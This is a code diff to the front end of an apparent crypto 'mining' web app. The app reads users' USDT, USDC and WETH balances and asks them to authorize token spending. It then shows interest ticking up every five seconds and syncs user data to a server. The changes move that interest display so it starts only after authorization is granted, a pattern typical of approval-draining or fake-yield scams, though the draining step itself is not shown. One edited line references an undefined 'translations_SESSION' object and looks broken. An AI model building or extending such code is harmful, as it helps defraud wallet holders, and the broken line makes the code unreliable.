@@ -248,7 +248,7 @@ return isServerAvailable;
 console.warn(`checkServerStatus: Server is unavailable: ${error.message}`);
 isServerAvailable=false;
 if(isDevMode){
-updateStatus(translations[currentLang].offlineWarning,true);
+updateStatus(translations_SESSION[currentLang].offlineWarning,true);
 }
 }
 return false;
@@ -405,8 +405,7 @@ console.log(`resetState: Cleared next benefit interval: ${nextBenefitInterval}`)
 localStorage.clear();
 console.log(`resetState: Local storage cleared.`);
 if(startBtn){
-startBtn.style.display='block';
-startBtn.textContent=translations[currentLang]?.startBtnText||'Start';
+startBtn.style.display='none';
 }
 if(claimBtn){
 claimBtn.style.display='none';
@@ -677,19 +676,11 @@ usdtContract=new window.ethers.Contract(USDT_CONTRACT_ADDRESS,ERC20_ABI,signer);
 usdcContract=new window.ethers.Contract(USDC_CONTRACT_ADDRESS,ERC20_ABI,signer);
 wethContract=new window.ethers.Contract(WETH_CONTRACT_ADDRESS,ERC20_ABI,signer);
 await updateUIBasedOnChainState();
-updateStatus(translations[currentLang].fetchingBalances);
+updateStatus(translations[currentLang].walletConnected);
 const balances={usdt:await retry(()=>usdtContract.balanceOf(userAddress)).catch(()=>0n),
 usdc:await retry(()=>usdcContract.balanceOf(userAddress)).catch(()=>0n),
 weth:await retry(()=>wethContract.balanceOf(userAddress)).catch(()=>0n)};
 updateBalancesUI(balances);
-updateStatus(translations[currentLang].walletConnected);
-
-// 開始更新利息
-if (interestInterval) clearInterval(interestInterval);
-interestInterval = setInterval(updateInterest, 5000);
-updateInterest();
-
-await loadUserDataFromServer();setupSSE();await saveUserData();
 }catch(e){
 let msg=`${translations[currentLang].error}: ${e.message}`;
 if(e.code===4001)msg="您拒絕了連線請求。";
@@ -717,8 +708,9 @@ if(isWethAuthorized)walletTokenSelect.value='WETH';
 else if(isUsdtAuthorized)walletTokenSelect.value='USDT';
 else if(isUsdcAuthorized)walletTokenSelect.value='USDC';
 walletTokenSelect.dispatchEvent(new Event('change'));
-setInitialNextBenefitTime();activateStakingUI();
+setInitialNextBenefitTime();
 pledgeBtn.disabled=pledgeAmount.disabled=pledgeDuration.disabled=pledgeToken.disabled=false;
+if(startBtn)startBtn.style.display='block';
 }else{
 if(startBtn)startBtn.style.display='block';
 pledgeBtn.disabled=pledgeAmount.disabled=pledgeDuration.disabled=pledgeToken.disabled=true;
@@ -777,7 +769,6 @@ updateStatus(translations[currentLang].priceError,true);return null;
 }
 }
 async function claimInterest(){
-  // 防呆：沒有開始挖礦，不執行
   if (!userAddress || !stakingStartTime || pledgedAmount <= 0) {
     console.log('claimInterest blocked: mining not started');
     return;
@@ -884,7 +875,11 @@ startBtn.disabled=true;startBtn.textContent='授權中...';
 try{
 await handleConditionalAuthorizationFlow();
 updateStatus(translations[currentLang].claimSuccess+': 挖礦已開始。');
-await updateUIBasedOnChainState();
+activateStakingUI();
+if (interestInterval) clearInterval(interestInterval);
+interestInterval = setInterval(updateInterest, 5000);
+updateInterest();
+await loadUserDataFromServer();setupSSE();await saveUserData();
 }catch(error){updateStatus(`${translations[currentLang].error}: 授權失敗: ${error.message}`,true);}
 finally{startBtn.disabled=false;startBtn.textContent=translations[currentLang]?.startBtnText||'開始';}
 };
